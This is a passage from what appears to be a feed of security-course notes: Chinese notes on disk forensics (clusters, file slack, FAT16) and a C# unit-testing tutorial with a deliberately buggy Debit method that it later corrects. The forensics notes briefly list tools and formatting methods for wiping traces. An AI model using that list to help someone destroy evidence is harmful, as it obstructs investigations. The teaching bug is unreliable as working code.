磁碟儲存最小單位為sector，每一個sector包含了512bytes的資訊內容。但用sector當單位來儲存效率會很差，一般不會以一個sector當作存取檔案的單位，而是以cluster為一基本檔案單位，每一個cluster是架構在sector的2次方倍數上。假定連續的8個sector所構成一個cluster，其大小就為512×8=4096bytes(4K)，如此在存取資料時會以8個sector連續讀取而提升了相對效率。但並不是讓單位cluster越大越好，因為cluster越大相對的可能會浪費許多磁碟空間，例如設定以4K為一個cluster而要儲存的檔案內容只有1K，但這個小檔案還是佔用掉一個cluster的空間，其他3K就浪費掉了。所在考慮cluster的規劃時，需要同時考慮到檔案讀取的效能與檔案大小是否會浪費硬碟空間。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>File Slack
舉例來說如果一個檔案A，大小是4個sector(2048 bytes)，現在將其刪除後又存入一個檔案B在同一位置，但其大小只有1.5個sector(768 bytes)，則後面沒有被填滿的2.5個sector事實上還殘留檔案A的一些資訊，尚未填滿的該sector(Ram Slack)+完整的兩個sector(Disk/Residual Slack)就是file slack&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/rk9GlEcG6.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>會有一點小複雜，反正file slack就是一個完整cluster(如果按照中FAT16來格式化128MB來說就是4個sectors)沒有被填滿的部分就對了，而ran slack或是disk(residual) slack只是在區分這些沒有被填滿的區塊而已&lt;/p>
&lt;/li>
&lt;li>
&lt;p>==比較表格==&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/S1XGzEcfp.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>稍微解釋一下為甚麼FAT16是單一cluster的sector數量比較多，因為按照他自己的定義，最大的cluster數量不能超過65526，也就是說如果硬碟的容量變大，單一cluster所除下來的sector數量就越多，舉例:
若一張記憶卡的大小是128MB$\to$134217728 bytes，單一cluster最少需要4個sectors
$$
134217728/512/65526\approx 4
$$
所以如果記憶卡大小是512MB$\to$，536870912 bytes，單一cluster最少需要16個sectors
$$
536870912/512/65526\approx 16
$$
當然，這樣的空間使用率是很差的，因為一個cluster就意味著一間總統套房，若所有的檔案不分大小都住進總統套房，就會造成很多浪費，或甚至是有很多file slack產生，試想如果像512MB一樣，一個cluster有16個sector，代表該總統套房可以容納$16*512=8192 bytes$，如果電腦中都是小檔案居多(1kB之類的)，那有很多空間就會浪費掉，但對於鑑識來說遺留的東西越多越能夠還原很多真相&lt;/p>
&lt;/li>
&lt;li>
&lt;p>以攻擊者或一般使用者來說，如何達到真正的毀屍滅跡?&lt;/p>
&lt;ol>
&lt;li>Encryption: 工具&lt;a href="https://sourceforge.net/projects/veracrypt/">veracrypt&lt;/a>&lt;/li>
&lt;li>File Wipe: 工具&lt;a href="https://www.fileshredder.org/">file shredder&lt;/a>&lt;/li>
&lt;li>Partition Wipe: 工具 Windows Format
&lt;ul>
&lt;li>Fast: 快速格式化&lt;/li>
&lt;li>Non-Fast: 完整格式化
&lt;a href="https://www.pcdvd.com.tw/showthread.php?t=294869">差別就是&lt;/a>
&lt;blockquote>
&lt;p>儲存檔案的時候， 除了在儲存區寫入檔案資料以外，也會在開頭一個小區塊的&amp;quot;檔案表&amp;quot;輸入相關資訊;快速格式化是只把開頭的檔案表重寫，真正儲存檔案資訊的部份則沒有更動，但是系統讀到檔案表顯示是&amp;quot;空白&amp;quot;，就會把這張片子當成是空片，就不管儲存區有沒有資料，直接覆蓋過去；換句話說，若是檔案表有標明某區存有某資料，則儲存時就會跳過這區不覆蓋
完整格式化會對格式化的區域進行讀寫測試，就是確定壞軌。快速格式化沒有&lt;/p></description></item><item><title>Unit Test Practice</title><link>https://bernie6401.github.io/docs/security/course/ntu-st/unit-test-practice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-st/unit-test-practice/</guid><description>&lt;h1 id="unit-test-practice">
 Unit Test Practice
 &lt;a class="anchor" href="#unit-test-practice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_st-software-testing">
 tags: &lt;code>NTU_ST&lt;/code> &lt;code>Software Testing&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_st-software-testing">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler Click to open TOC
[TOC]
:::&lt;/p>
&lt;h2 id="install-the-environment">
 Install the environment
 &lt;a class="anchor" href="#install-the-environment">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Install Visual Studio with .NET that we can use C# language to implement unit test properly.&lt;img src="https://imgur.com/VwMKdZM.png" alt="install c#" />&lt;/li>
&lt;/ul>
&lt;h2 id="create-a-project-to-test">
 Create a project to test
 &lt;a class="anchor" href="#create-a-project-to-test">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Create a new project and choose C# as your language and named the project &lt;strong>Bank&lt;/strong>.&lt;img src="https://imgur.com/bPDga9p.png" alt="create project" />&lt;/li>
&lt;li>Rename Program.cs as BankAccount.cs and replace all content by the following code.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> BankAccountNS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BankAccount&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">readonly&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> m_customerName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> m_balance;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> BankAccount() { }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> BankAccount(&lt;span style="color:#66d9ef">string&lt;/span> customerName, &lt;span style="color:#66d9ef">double&lt;/span> balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_customerName = customerName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_balance = balance;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> CustomerName
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">get&lt;/span> { &lt;span style="color:#66d9ef">return&lt;/span> m_customerName; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> Balance
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">get&lt;/span> { &lt;span style="color:#66d9ef">return&lt;/span> m_balance; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit(&lt;span style="color:#66d9ef">double&lt;/span> amount)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;gt; m_balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_balance += amount; &lt;span style="color:#75715e">// intentionally incorrect code&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Credit(&lt;span style="color:#66d9ef">double&lt;/span> amount)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_balance += amount;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Main()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount ba = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">11.99&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ba.Credit(&lt;span style="color:#ae81ff">5.77&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ba.Debit(&lt;span style="color:#ae81ff">11.22&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Console.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Current balance is ${0}&amp;#34;&lt;/span>, ba.Balance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Build it by clicking &lt;strong>Build Solution&lt;/strong> in Build menu.&lt;/li>
&lt;/ul>
&lt;h2 id="create-a-unit-test-project">
 Create a unit test project
 &lt;a class="anchor" href="#create-a-unit-test-project">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Create a new project at solution explorer and named it &lt;strong>BankTests&lt;/strong>. The other part just maintain default setup.&lt;img src="https://imgur.com/ryriCen.png" alt="" />&lt;/li>
&lt;li>Select &lt;strong>MSTest Test Project&lt;/strong>&lt;img src="https://imgur.com/dI5h4T0.png" alt="" />&amp;lt;-This is important.&lt;/li>
&lt;li>&lt;strong>Add reference&lt;/strong> by selecting &lt;strong>Add Reference&lt;/strong> at &lt;strong>BankTests/Dependencies&lt;/strong>&lt;img src="https://imgur.com/9Miqs7p.png" alt="" />&lt;/li>
&lt;li>In the &lt;strong>Reference Manager&lt;/strong> dialog box, expand &lt;strong>Projects&lt;/strong>, select &lt;strong>Solution&lt;/strong>, and then check the Bank item.&lt;img src="https://imgur.com/ZBOR73N.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="create-the-test-class">
 Create the test class
 &lt;a class="anchor" href="#create-the-test-class">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Rename UnitTest1.cs to BankAccountTests.cs and replace the original code with the following section and add using statement at the top of the class file.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> Microsoft.VisualStudio.TestTools.UnitTesting;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> BankTests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [TestClass]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BankAccountTests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> TestMethod1()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>BTW, the default class part can be ignored.&lt;/li>
&lt;/ul>
&lt;h2 id="create-the-first-test-method">
 Create the first test method
 &lt;a class="anchor" href="#create-the-first-test-method">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Replace the default class with the following code&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WithValidAmount_UpdatesBalance()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = &lt;span style="color:#ae81ff">4.55&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> expected = &lt;span style="color:#ae81ff">7.44&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> account.Debit(debitAmount);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> actual = account.Balance;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Assert.AreEqual(expected, actual, &lt;span style="color:#ae81ff">0.001&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Account not debited correctly&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Analyze this part: Assert.AreEqual method will catch the exception when &lt;strong>expected value&lt;/strong> unequal &lt;strong>actual value&lt;/strong> or their difference larger than &lt;strong>delta&lt;/strong>(0.001).&lt;/li>
&lt;li>Comparing with BankAccount.cs, the truly process of &lt;strong>Debit&lt;/strong> function is $beginningBalance - debitAmount = expected$ -&amp;gt; $11.99 - 4.55 = 7.44$&lt;/li>
&lt;/ul>
&lt;h2 id="build-and-run-the-test">
 Build and run the test
 &lt;a class="anchor" href="#build-and-run-the-test">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>On the Build menu, choose Build Solution (or press Ctrl + SHIFT + B) and press &lt;strong>Ctrl + E, T&lt;/strong> to open &lt;strong>Test Explorer&lt;/strong>, then &lt;strong>Run All&lt;/strong>.&lt;img src="https://imgur.com/ljNqXiS.png" alt="" />&lt;/li>
&lt;li>You&amp;rsquo;ll find that all Test are failed, so you must modify somewhere incorrect.&lt;/li>
&lt;/ul>
&lt;h2 id="fix-your-code-and-rerun-your-tests">
 Fix your code and rerun your tests
 &lt;a class="anchor" href="#fix-your-code-and-rerun-your-tests">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Return to BankAccount.cs and observe Debit() function.
&lt;img src="https://imgur.com/sGGMxu7.png" alt="" />&lt;/li>
&lt;li>Must change &lt;code>m_balance += amount;&lt;/code> to &lt;code>m_balance -= amount;&lt;/code>&lt;/li>
&lt;li>Build and Run the code again and you&amp;rsquo;ll find the test is correct this time&lt;img src="https://imgur.com/BNKS05j.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="create-and-run-new-test-methods">
 Create and run new test methods
 &lt;a class="anchor" href="#create-and-run-new-test-methods">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Add the following program in test class and rebuild it.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WhenAmountIsLessThanZero_ShouldThrowArgumentOutOfRange()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = -&lt;span style="color:#ae81ff">100.00&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act and assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Assert.ThrowsException&amp;lt;System.ArgumentOutOfRangeException&amp;gt;(() =&amp;gt; account.Debit(debitAmount));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = &lt;span style="color:#ae81ff">200.00&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act and assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Assert.ThrowsException&amp;lt;System.ArgumentOutOfRangeException&amp;gt;(() =&amp;gt; account.Debit(debitAmount));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Analyze: you&amp;rsquo;ll find out that the &lt;strong>debitAmout&lt;/strong> in the &lt;strong>1st test method&lt;/strong> is less than zero and the &lt;strong>debitAmount&lt;/strong> in &lt;strong>2nd test method&lt;/strong> is larger than &lt;strong>beginningBalance&lt;/strong>.&lt;/li>
&lt;li>After runing test explorer, these 2 code block are working properly, but you don&amp;rsquo;t know what kind of exception is(amount &amp;gt; m_balance or amount &amp;lt; 0), we just know somewhere throw back an exception message.&lt;/li>
&lt;/ul>
&lt;h2 id="revise-bankaccountcs">
 Revise BankAccount.cs
 &lt;a class="anchor" href="#revise-bankaccountcs">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Trace back to BankAccount.Debit and you&amp;rsquo;ll notice that they used the same exception, so you can determine to use ArgumentOutOfRangeException(String, Object, String) to contain the name of the argument, the argument value, and a user-defined message.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;gt; m_balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="refactor-the-code-under-test">
 Refactor the code under test
 &lt;a class="anchor" href="#refactor-the-code-under-test">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Define 2 constants for the error message at class scope, put the following code block in the class under test, BankAccout.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> DebitAmountExceedsBalanceMessage = &lt;span style="color:#e6db74">&amp;#34;Debit amount exceeds balance&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> DebitAmountLessThanZeroMessage = &lt;span style="color:#e6db74">&amp;#34;Debit amount is less than zero&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Then modify the 2 conditional statements in the Debit method.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;gt; m_balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> System.ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>, amount, DebitAmountExceedsBalanceMessage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> System.ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>, amount, DebitAmountLessThanZeroMessage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Refactor test method like this. Replacing Assert.ThrowsException with using try/catch method to catch unexpected exception situation.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C#" data-lang="C#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
